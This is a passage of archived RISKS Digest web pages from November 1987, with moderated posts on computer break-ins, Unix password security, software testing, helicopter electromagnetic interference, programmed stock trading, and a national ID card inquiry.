might have helped (including sounder operating systems, better enforcment of
separation of privileges in system use and application design, better user
identification and authentication, better audit trails and real-time
analysis, etc.):

SH Stanford network breakins (SEN 11 5)
SH Crackers break into AT&amp;T computer systems (SEN 12 4)
SH W.German crackers plant Trojan horses, attack NASA, DoE systems (SEN 12 4)
SH Various other Trojan horses (SEN 12 4, etc.)
$H Volkswagen lost $260M, computer tampering foreign-exchange fraud (SEN 12 2)
$SH Phone credit-card numbers stolen from computer.  $500M total? (SEN 12 3)
$H  N-step reinsurance cycle; software checked for N=1 and 2 only (SEN 10 5)
    [although this would have required application-level integrity controls]
$SH 18 arrested for altering cellular mobile phones for free calls (SEN 12 2)

(SEN References are to Software Engineering Notes.  Most of these also
appeared in RISKS on-line.)

There are lots more cases.  These are just a few to get you started.  Peter

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Re: Unix password encryption, again?
</A>
</H3>
<address>
Dan Hoey 
&lt;<A HREF="mailto:hoey@nrl-aic.ARPA">
hoey@nrl-aic.ARPA
</A>&gt;
</address>
<i>
5 Nov 1987 11:39:10 EST (Thu)
</i><PRE>
To: Risks@KL.SRI.COM

In Risks 5.48, Russ Housley asks whether Unix's ``modified DES'' is a
one-way hash.  Let us first pick nits:  he was not asking this of the
modified DES per se, but of the Unix password mapping algorithm.  The
DES and modified DES are cryptosystems, while the password mapping is a
transformation from the user's password to an ``encrypted'' version.
Confusion arises because the password mapping algorithm uses the modi-
fied DES as a subroutine, so there is a strong temptation to say that
the password has been ``encrypted by the modified DES''.  This usage of
the term ``encrypt'' is at odds with the common cryptological concept of
a transformation by which information is transformed for later decryp-
tion by a secret algorithm, or an algorithm that uses a secret key.

A second point of terminology concerns the term ``one-way hash'', which
has been interpreted in four different ways by me and the three people I
have discussed it with in private communication.  Russ Housley used the
term for the composition of a hash function and a one-way function.  (A
``hash'' function is a function that maps a large domain to a smaller
range.  A ``one-way'' function is a function that is computationally
infeasible to invert.)  When Matt Bishop (Risks 5.49) answered that the
password mapping was not a one-way hash, he was referring to the fact
that the password mapping is not a good hash function--the only hashing
that goes on is ignoring all but the first eight characters.  Peter
Neumann interpreted ``one-way'' as referring to a function that maps
many-to-one (a reading invited by the term ``hash'').  Certainly, it is
impossible in a sense to invert a many-to-one function F, since X cannot
be determined from F(X).  My understanding of a one-way function is one
for which it is hard to find any X' for which F(X')=F(X).  Such a
function can be either many-to-one or one-to-one; I suspect that the
password mapping is many-to-one even on eight-character passwords.

So, in answer to Russ's question, the password mapping is designed to be
a one-way function, but we have no proof that it succeeds.  In a prac-
tical sense, no one knows whether the password function is hard to
invert, though no one has reported an easy way.  In a theoretical sense,
if P=NP (and perhaps if not) then no one-way functions exist.

But even if the password mapping algorithm is a one-way function, it is
not very secure.  Any one-way function can be broken by trying all of
the possible inputs.  In his message, Matt illustrated this with an
example of 100 users who chose passwords from a 25,000-word dictionary.
He described the effect of the modified DES, noting that a search for
the passwords would require 2,500,000 password mappings, and concluded
that ``the time for such a search should be unacceptably high.''

In a later private communication, he clarified this.  The example he
gave was intended only to describe the purpose of the modification to
DES, and not to claim that 2,500,000 password mappings are a serious
barrier to password breaking.  You might not realize that if you use the
software distributed with Unix, which would require ten days for the
task on a SUN 3.  But last year, Robert W. Baldwin announced a way of
speeding up the password mapping by a factor of 300, using VAX assembler
code and some tricks.  Using his tricks and some of my own, I wrote a
fairly fast password mapping in C, and in fact Matt Bishop has his own
fast C implementation.  So those 2,500,000 mappings can be undertaken by
Matt on his SUN 3 in about eight hours, or by Bob on his VAX 8600 in
about forty minutes.  And if Rick Gumpertz is still out there with his
Cray, carry a laser.

The clear and present risk to a Unix system is that the users may have
chosen passwords that can be found in a list of words, of words spelled
backwards, of first names, of the first letters of famous quotations, of
possible license plate numbers, of the six-letter strings, of the
eight-digit strings, of the geometrical keyboard patterns, or any other
fairly short machine-accessible list.

I am horrified at the amount of verbiage it takes to straighten out these
simple misunderstandings.  If you want to know more about the issues, read
Morris and Thompson's ``Password Security: A Case History'' in the November
1979 CACM or your Unix Manual Set (volume 2, or System Manager's Manual,
depending on how your set is organized).  Please do not court the wrath of
the S. P. F. D. H. by further flogging this dead horse, or me.

Dan Hoey
          [This message is the result of extensive trialogue among Dan, Matt
          Bishop, and PGN.  There were enough confusions exhibited by other
          readers in other messages -- including a bunch which have not been
          included in RISKS  -- that it seemed worthwhile to try to set the
          record straight.  I hope this won't lead to further confusion.  PGN]

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Software Testing
</A>
</H3>
<address>
Danny Padwa
&lt;<A HREF="mailto:padwa%harvsc3@harvard.harvard.edu2 ">
padwa%harvsc3@harvard.harvard.edu2 
</A>&gt;
</address>
<i>
Thu, 5 Nov 87 15:53:39 est
</i><PRE>

	John Haller mentioned the question of software testing an issue or two
ago. Last summer I worked at a financial information company which (for obvious
reasons) takes software reliability very seriously. They had a testing system,
which, although sometimes tedious, seems to work extremely well.

	When the development group is ready with a software release, they
forward it to the quality assurace group, puts it up on a test system and
tries very hard to break it (i.e. we simulated market conditions that make
"Blue Monday" look like nothing). Very detailed test plans are written and
carried out, testing all sorts of possible failures.

	When the QA group signs off on it (often after a few trips back to
development for tuning) a software package goes to the Operations Testing
Group, which runs it on a test string exactly the way it would run after
release. If it is consistent with currently operating systems for about a week,
it is then released to the operations teams.

	While this is not a sure-fire solution, it does make reasonably sure
that any software that goes "live" can handle normal conditions (the Ops
testing) and weird ones as well.

	Does anyone out there have similar experiences with multiple-redundancy
in testing. (NOTE: The various testing groups are relatively well separated
		administratively, so that pressure on one group usually is not
		paralleled by pressure on another.
			Danny Padwa, Harvard University

 BITnet: PADWA@HARVSC3.BITNET   HEPnet/SPAN: 58871::PADWA (node HUSC3)
 MFEnet: PADWA@MFE.MFENET	UUCP: ...harvard!husc4!padwa	      
									      
38 Matthews Hall, Harvard University, Cambridge MA 02138 USA

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Risks of using mailing lists
</A>
</H3>
<address>
Dave Horsfall
&lt;<A HREF="mailto:munnari!astra.necisa.oz.au!dave@uunet.UU.NET ">
munnari!astra.necisa.oz.au!dave@uunet.UU.NET 
</A>&gt;
</address>
<i>
5 Nov 87 13:20:19 +1100 (Thu)
</i><PRE>

Quoted from the Sydney Morning Herald, 19 Oct 87:

``An Albion Park [Sydney suburb] reader didn't have to open the
letter from a Sydney computer software company to know the status
of his account.  On the envelope, between his name and address,
was printed: "35 days UNFINANCIAL".''

Obviously, the billing software merely took the data base details
as a mailing list label...
                                      -- Dave

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/5.54.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.56.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-8</DOCNO>
<DOCOLDNO>IA012-000130-B022-6</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/5.56.html 128.240.150.127 19970217014034 text/html 30632
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:38:58 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 5: Issue 56</TITLE>
<LINK REL="Prev" HREF="/Risks/5.55.html">
<LINK REL="Up" HREF="/Risks/index.5.html">
<LINK REL="Next" HREF="/Risks/5.57.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/5.55.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.57.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 5: Issue 56</H1>
<H2> Monday, 9 November 1987 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
News article on EMI affecting Black Hawk helicopter 
</A>
<DD>
<A HREF="#subj1.1">
John Woods
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  A New Twist with Cellular Phones 
</A>
<DD>
<A HREF="#subj2.1">
Leo Schwab
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Computers Amplify Black Monday 
</A>
<DD>
<A HREF="#subj3.1">
Bjorn Freeman-Benson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Programmed stock trading 
</A>
<DD>
<A HREF="#subj4.1">
Michael R. Wade
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Tape label mismatch 
</A>
<DD>
<A HREF="#subj5.1">
Jeff Woolsey
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Phantom Traffic Tickets 
</A>
<DD>
<A HREF="#subj6.1">
Isaac K. Rabinovitch
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  National ID Card (Australia)  
</A>
<DD>
<A HREF="#subj7.1">
Tom Nemeth
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Unix 8-character password truncation and human interface 
</A>
<DD>
<A HREF="#subj8.1">
Geoffrey Cooper
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  setuid (once more)  
</A>
<DD>
<A HREF="#subj9.1">
George Kaplan
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  Re: Minuteman Missiles 
</A>
<DD>
<A HREF="#subj10.1">
Mike Bell
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj11">
  Mailing List Humor 
</A>
<DD>
<A HREF="#subj11.1">
Bjorn Freeman-Benson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj12">
  A new kind of computer crash 
</A>
<DD>
<A HREF="#subj12.1">
Steve Skabrat
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
News article on EMI affecting Black Hawk helicopter
</A>
</H3>
<address>
John Woods
&lt;<A HREF="mailto:jfw@EDDIE.MIT.EDU2 ">
jfw@EDDIE.MIT.EDU2 
</A>&gt;
</address>
<i>
Sun, 8 Nov 87 20:18:27 EST
</i><PRE>

(Well, after the reports of the President's plane affecting people's garage
doors, I guess it is appropriate that we are able to return the "favor"...)

     Radio waves reportedly can down copter
     By Mark Thompson, Knight-Ridder Service
     (From the Boston Globe, 8 November 1987)

WASHINGTON - The Army's most advanced helicopter to carry troops into battle
can be knocked out of the sky by routine radio waves from microwave
towers, radio antennas, and radars, according to Pentagon officials and
documents.
   Investigators believe such radio waves made five of the Army's UH-60 Black
Hawks nosedive into the ground since 1982, killing 22 servicemen.  The
problem could be even more devastating in wartime, they said, because
the Soviets are perfecting a radio-wave weapon to exploit the vulnerability.
   "We've got a very sophisticated electronic aircraft, and if the
radiation we're putting up in peacetime -- microwaves, antennas, TVs --
is causing the aircraft to flutter and wobble, then -- and I don't like
to talk about this because it is kind of a breach of security -- we're
going to have problems in wartime,"  said Jerry A. McVey, a former Army
major who led the investigation into a still-unexplained Black Hawk
crash last year.
   Radio waves in the air can enter the helicopter's wiring and
electrical components and generate false commands that can range from
simply flashing the warning lights to sending the craft into a fatal dive.
   The Army recently warned its Black Hawk pilots that flight near radio
towers can cause unexpected dives that could endanger the $6 million aircraft.
"Pilots should be made aware that flights near microwave antennas or
shipboard radar may cause uncommanded attitude changes," the Army told
its pilots in August following extensive tests earlier this year.
   But despite such warnings, the Army maintains there is no safety problem.
"None of the anomalies encountered during these tests resulted in
control movements causing flight safety critical conditions," the Black
Hawk's management office said in a videotaped briefing for the pilots.
   A three-month investigation by Knight-Ridder has found:
   * The Army grounded all UH-60s last year after one crashed near a
high-powered citizens' band transmitter in Alabama, killing all three
servicemen aboard.  But Army aviation officials ordered the copters
back in the air 49 days later without telling pilots -- or the Army's
top general -- that the service's safety experts believed there was
a 50 percent chance of a similar accident within a year.
   * In five mysterious accidents, the Black Hawks were flying below
1,000 feet when they suddenly dove straight into the ground, killing
everyone aboard.  While the Army listed mechanical causes for three of
the crashes, senior Army investigators say they believe radio waves,
called electro-magnetic interference (EMI), were the real culprits.  The
other two crashes are officially unsolved, although investigators
suspect EMI.
   * While the Army minimizes the Black Hawk's vulnerability to radio
waves, the Navy, which also uses the aircraft, has taken a far different
approach.  The Navy barred its first 14 Black Hawks -- bought for
training purposes in 1982 -- from coming within "a significant number of
miles" of radio towers for fear of accidents, a senior Navy engineer
said.  The precise distance is classified.  The Navy later demanded that
its future Black Hawks, known as Sea Hawks, be heavily shielded from
electronic interference.  They can now buzz radio towers with impunity.
   Officials as Sikorsky Aircraft Co., which builds the helicopters for
both services, said they deliver aircraft shielded to each service's
requirements, but declined to comment on the adequacy of the Army's
standards.
   Because EMI leaves no "fingerprints," the Army has been unable or
unwilling to cite it as a cause of any of the 29 Black Hawk accidents
that have killed 48 servicemen since 1980.  Shielding the Army Black
Hawks to Navy standards would be "very costly," Army officials said.
   Many of the military officials, pilots, engineers and investigators
interviewed in the investigation of the Black Hawk agreed to speak only
on condition that their names would not be used.  Most of these sources
are in sensitive positions and said they could lose their jobs or face
disciplinary action if they are identified.
   But they speak with certainty about EMI's dangers.
   "EMI is causing these aircraft to flip upside down and crash and kill
everybody on board," said one senior Army aviator.  "There is a definite
problem with the Black Hawk and EMI -- no question about it."
   EMI is most deadly when it tinkers with the Black Hawk's movable rear
wing and its crucial hydraulic system.  Both are operated by minute
electric signals that can be overwhelmed by outside electronic interference.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
A New Twist with Cellular Phones
</A>
</H3>
<address>
Leo 'Bols Ewhac' Schwab
&lt;<A HREF="mailto:hpscda!hpscdl!hplabs!well!ewhac@seismo.CSS.GOV ">
hpscda!hpscdl!hplabs!well!ewhac@seismo.CSS.GOV 
</A>&gt;
</address>
<i>

</i><PRE>
Date: 6 Nov 87 10:21:29 GMT
Organization: Whole Earth 'Lectronic Link

	Related to me by my father:

	My uncle, who operates a mobile comminucations shop (CB's, car
stereos, and such) was asked to install a cellular phone into a Pontiac
Fiero.  When it came time to install the antenna, he wondered if it was
kosher to install it on the rear hood, where the engine is located.  As I
recall, the antenna runs at 800 MHz.

	He called Pontiac.  After wading through a bit of bureaucracy, he
got a technician on the line.  The tech said that installing a cellular
phone antenna in that position would cause bad things to happen to the
electronic fuel injection.  He didn't specify what sort of bad things.

	It seems to me that, if the electronic fuel injection were properly
shielded, this problem wouldn't exist.  It also seems to me that proper
shielding is trivial.  Am I missing something?  Is Pontiac missing
something?
                                     Leo L. Schwab

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Computers Amplify Black Monday
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Mon, 09 Nov 87 08:18:54 PST
From: Bjorn Freeman-Benson &lt;bnfb@june.cs.washington.edu&gt;

In the article "Computers Amplify Black Monday", _Science_,
30 October 1987, Volume 238, Number 4827, there is an interesting
discussion of the potential effects that computers had.  The most
interesting parts were:

    "Large scale, distributed computing systems have been proposed in
    a wide variety of applications ...  The automated stock market may
    thus hold some important lessons for the future.  Indeed, recent ...
    research suggests that large distributed systems of this kind may be
    governed by ... chaos --- which means that they may be inherently
    unpredictable ..."
	NYSE chairman Phelan warned that "... computerized trading
    practices in general are a stabilizing influence only when the market
    itself is relatively quiet.  When things become unsettled, computerized
    trading could all too easily become destabilizing."
	The article goes on to quote Bernardo Huberman and Tad Hogg at
    Xerox PARC, and their work on modeling "computational ecologies".

and...

    "The momentum for further computerization on Wall Street is clearly
    high. ... This momentum is leading Wall Street to delegate more and
    more of its day-to-day decision making power to the computers ---
    a prospect that many people find troubling.  Of course, a
    hypercomputerized Wall Street might not be so different from the
    Wall Street of today.  Brokers are already making $100 million
    decisions on 60-second time scales, using nothing for input but
    the flow of numbers on a computer screen.  It is hard to imagine
    that they are giving those decisions any deep thought, of
    bringing any considered judgement to bear.  What the prospect
    does do, however, is to throw a spotlight on the kind of
    economic models being used to program these computers.  The
    economic assumptions may be valid enough for normal times."
	John L. King (UC Irvine) says "But it's like a nuclear power
    plant -- the emergency system is very important, even if you use
    it only once a year." and "what Monday illustrates to me is just
    how little we know."

These points make me worry more about the problems of software engineers who
write software without knowing the problem domain.  And furthermore, even if
we/they know the domain, it may be controlled by "chaos", and may be
inherently unpredictable.
				Bjorn N. Freeman-Benson

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Programmed stock trading
</A>
</H3>
<address>
"MICHAEL R. WADE ( GIPSY MANAGER )" 
&lt;<A HREF="mailto:WADE%vtcs1.cs.vt.edu@RELAY.CS.NET">
WADE%vtcs1.cs.vt.edu@RELAY.CS.NET
</A>&gt;
</address>
<i>
Thu, 5 Nov 87 16:28 EST
</i><PRE>
To: risks@csl.sri.com

In <A HREF="/Risks/5.49.html">RISKS-5.49</A> Bob Berger writes :

&gt; I hope that the experience of a large network of computers doing something
&gt; unplanned for such as accelerating the crash of the stock market will make
&gt; the "Decision Makers" stand up and take notice! [...]

   It appears that Bob has missed the "REAL" risk of this situation.  The
automatic trading programs all behaved as expected and correctly within
their own environment.  The problem is that none of these systems had
knowledge, or at least only severly limited knowledge, about their external
environment.  The In this case we were dealing with the interaction of many
independent systems where these relationships were not fully understand
and/or planned for.  The real risk is when system designers do not
understand the relationship between all of the various components that are
part of a real world environment.  This has a direct impact on software
certification procedures for any system, because it is not acceptable to
certify the functionality of each piece of a system and then declare the
system correct.
                  Michael R. Wade, Spatial Data Analysis Lab, Virginia Tech

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Tape label mismatch (<A HREF="/Risks/5.55.html">RISKS-5.55</A>)
</A>
</H3>
<address>
Jeff Woolsey 
&lt;<A HREF="mailto:woolsey@nsc.NSC.COM">
woolsey@nsc.NSC.COM
</A>&gt;
</address>
<i>
Fri, 6 Nov 87 10:50:38 PST
</i><PRE>
Organization: National Semiconductor, Sunnyvale

In RISKS 5.55 Geoff Lane writes about an operator overriding a check for
tape label mismatch causing his tape to be overwritten.

A similar thing happened to me when I was working with tapes on a CDC
Cyber.  The installation handled transient tapes in much the same way,
except that there is no opportunity for operator intervention on a
label miscompare.  There is, however, nothing preventing two or more
tapes being in the transient library with the same VSN (but different
IDs).  Furthermore, there is nothing in the operating system preventing
two labelled tapes being mounted at the same time with identical VSNs,
and the system will assign the one on the lower-numbered drive to the
first job that wants it, even if it wanted the other tape, and even if
it specified the ID.  If the tape is ANSI-labelled, the system does not
ask the operator for the ID written on the paper label.

In my case, I ran a three-tape archive for a friend, and when later I
tried to retrieve something from the first (identical) tape, the tape
was blank but had the right label. In this case it looked like the tape
was re-initialized by someone else who thought they were putting labels
on their own tape.  Again, nothing prevents a user from entering a tape
into the transient library and re- initializing it with a different
VSN, possibly one of another tape already in the library, creating
another opportunity for mounting the wrong tape.

On an even less-related note, I once noticed on a 4.2bsd system that
the root file system was 105% full.  The cause was a plain file of two
megabytes called /dev/nmrt0.  Some poor user thought his thesis work
was on the tape he was carrying across country....

LERMINATING PREVIOUS SESSION.  PQEASE RETRY.

                [(Sic!)  I could not resist leaving that line in.  PGN]

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Phantom Traffic Tickets
</A>
</H3>
<address>
&lt;<A HREF="mailto:portal!cup.portal!Isaac_K_Rabinovitch@Sun.COM">
portal!cup.portal!Isaac_K_Rabinovitch@Sun.COM
</A>&gt;
</address>
<i>

</i><PRE>
Date: Fri Nov  6 17:02:48 1987

Before David Honig concludes that he can safely forget about those phantom
UCI parking tickets, he should probably read Gordon Dickson's classic SF
story, "Computers Don't Argue".  In this story, a book club member who
doesn't want to pay for an unordered copy of "Kidnapped," by Robert Louis
Stevenson is arrested for kidnapping R. L. Stevenson (a capital offense,
since the victim is dead).  This story might have had a happy ending,
except, well, computers don't argue.

Actually, it might be irresponsible of me to make a joke of this
or treat it as Science Fiction.  It's worth noting that this
phantom warrant might lie around various disk drives for a long
time, and any traffic cop who stops Mr. Honig for a broken
taillight has no way knowing that the positive warrant check is
the result of a software error.  While not that serious an
offense, unpaid tickets *are* cause for immediate arrest -- and
bail bondsmen are not anxious to cover legal amnesiacs.

Isaac Rabinovitch

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
National ID Card (Australia)
</A>
</H3>
<address>
Tom Nemeth
&lt;<A HREF="mailto:munnari!augean.oz.au!tnemeth@uunet.uu.net ">
munnari!augean.oz.au!tnemeth@uunet.uu.net 
</A>&gt;
</address>
<i>

</i><PRE>
Date: 5 Nov 87 00:01:32 GMT

You may be aware that recently a national ID card scheme in Australia was
defeated (unfortunately only on a technicality).  However, as a result, the
Senate Standing Committee on Constitutional Affairs is holding an inquiry
into the whole mess.  Written submissions close on December 11, public
hearings will begin next February, and the report is required by May.
Submissions are invited from all and sundry.  I enclose the terms of
reference for your interest.

- = - = - = - = - = - = - = - = - = - = - = - = - = - = - = -
TERMS OF REFERENCE

(a)  the provisions of the Australia Card Bill 1986 considered in the light
of the reports of the Joint Select Committee on the Australia Card and of
the Scrutiny of Bills Committee;

(b)  the feasibility of any proposed national identity system operating in
the event of a failure of any one or more States to co-operate on the
establishment of a births, deaths and marriages register;

(c)  the extent to which new or updated computer systems and recent
crackdown campaigns on welfare cheating and tax avoidance and evasion have
obviated the need for a national identity system;

(d)  the appropriate responses which should be made to the recommendations
contained in the various Australian Federal Police reports on fraud against
the Commonwealth and the Report of the Review of Systems for Dealing with
Fraud of the Commonwealth;

(e)  the direct cost to the private sector in establishing and maintaining
any such system;

(f)  the capacity of the proposed Data Protection Agency to adequately
safeguard and protect the privacy of the individual and to control
unauthorized use of any proposed national identity card and/or individual
identification numbers by commercial organizations such as credit insurance
companies and unincorporated associations and clubs;

(g)  the desirability, timing and nature of comprehensive privacy
legislation in Australia in the light of concerns raised in the debate over
the proposed Australia Card legislation;

(h)  the extent to which any proposed system should accord with OECD
guidelines on the Protection of Privacy and Transborder Flows of Personal
Data (1981);

(i)  the extent of personal data held on Australian citizens by Government
Departments and Agencies and by private sector agencies, its level of
accuracy, access to it and its cross-referencing within the Government
sector;

(j)  the security of data already held by Government Departments and
Agencies;

(k)  the physical security of dedicated land lines and other data
transmission facilities currently in use or proposed;

(l)  the appropriate range and level of penalties on individuals and other
entities, which should be imposed for the improper use or release of
personal data;

(m)  the evidence available from overseas as to the experience of other
countries with identity card systems, including the taking of evidence from
overseas expert witnesses;

(n)  the usefulness of any card and numbering system in achieving the
objectives of reducing the extent of the cash economy, organized crime and
large-scale tax evasion and welfare fraud; and

(o)  any matters relevant to the preceding.

(Journals of the Senate, No. 12, dated 8 October 1987)

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Unix 8-character password truncation and human interface
</A>
</H3>
<address>
Geoffrey Cooper
&lt;<A HREF="mailto:imagen!geof@decwrl.dec.com ">
imagen!geof@decwrl.dec.com 
</A>&gt;
</address>
<i>
Fri, 6 Nov 87 14:13:06 PST
</i><PRE>

This message is quite a bit late -- I got busy, and then waited until I
had time to catch up on Risks before answering.

My sincere apologies to the moderator for starting the recent barrage
of Unixalia.  My original comment, which has perhaps receded into the
umbrageous recollections of RISKS Digests past, concerned the SILENT
truncation of a password to 8 characters on 4.3 BSD.  I am overwhelmed
at the quantity and depth of discussion on the security of the modified
DES algorithm, the propensity of a Cray to zap Sun 3 passwords with a
laser, etc., all of which misses the original point (but is perhaps
interesting in its own right).

The PROBLEM is that a program to set passwords sets the password to
something other than its input, without warning the user.  The RISK is
that the user might end up with a non-secure password as a result.  I
have seen the same problem, exhibited by the (Massachusetts based)
BayBanks automated teller system.  In that case it resulted in dollar
loss and a squabble between the bank and an innocent customer, when an
ATM card thief was easily able to guess a password (this occured some
time ago - one imagines that the problem has since been fixed).  In my
case, the problem resulted in an account in an obscure corner of the
DoD internet that had a password which was easy to guess.  The password
remained for a week or two, and I don't believe that the account was
penetrated (other than by me!).

We engineers have a tendency to allow our fascination with technical
solutions to distract us from the issue at hand: this is a true "risk."
The technical solution to the bug I mentioned is trivial -- modify the
program that sets passwords to warn you when a password is being
truncated.  Other interesting technical solutions have been presented
in this forum.

I echo PGN's recent comment that it is a poor user interface to a system's
security features that is often the easiest entry point to the penetrator,
rather than a deficiency in the system's operation.
                                                        - Geof Cooper

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
setuid (once more) 
</A>
</H3>
<address>
George Kaplan
&lt;<A HREF="mailto:gckaplan%sag4.ssl.Berkeley.EDU@jade.berkeley.edu ">
gckaplan%sag4.ssl.Berkeley.EDU@jade.berkeley.edu 
</A>&gt;
</address>
<i>
Fri, 6 Nov 87 09:43:42 PST
</i><PRE>

In RISKS-FORUM Digest Vol 5, Issue 55, Stephen Russell discusses a bug
in a student assignment submission system:

&gt;   ...             It then invokes the second program, which is basically
&gt; a setuid root file copy program. It needs to be setuid root, as it writes
&gt; into a protected directory. The copy program is publicly executable, although
&gt; (we believed) reasonably well hidden.

The directory has to be protected, of course, and the copy program has to be
setuid, but why to root?  If the assignment directory is owned by a normal
user account, perhaps an account set up specifically for the class or
professor, then it is just as protected from casual snooping as a directory
owned by root.  Then even if the security checks of the file copy program
are breached, the intruder can damage only files associated with the class.
This is bad news for the class, I suppose, but the system is protected.

George Kaplan           Internet: gckaplan@sag2.ssl.berkeley.edu
                        UUCP: ...!ucbvax!ucbssl!sag2!gckaplan

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
Re: Minuteman Missiles (Unsung Heroes)
</A>
</H3>
<address>
Mike Bell 
&lt;<A HREF="mailto:mcvax!camcon!mb@uunet.UU.NET">
mcvax!camcon!mb@uunet.UU.NET
</A>&gt;
</address>
<i>

</i><PRE>
Date: 5 Nov 87 16:58:12 GMT
Organization: Cambridge Consultants Ltd., Cambridge, UK

in RISKS 5.52 John J. McMahon says:

&gt; ...  Their immediate reaction was to take a large armored personel carrier 
&gt; (APC) and park it on the missile silo...

I'm very much impressed by this cool, clear, lateral thinking. 

(Or was this the solution in the Minuteman manual?)

Surely there must be other examples of people averting `computer'
disasters by unobvious mechanical means...

Mike Bell UUCP:  ...seismo!mcvax!ukc!camcon!mb  Phone: +44 223 358855

</PRE>
<A NAME="subj11"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj11.1">
Mailing List Humor
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Mon, 09 Nov 87 15:34:12 PST
From: Bjorn Freeman-Benson &lt;bnfb@june.cs.washington.edu&gt;

Today I received a computer-generated junk letter that had three
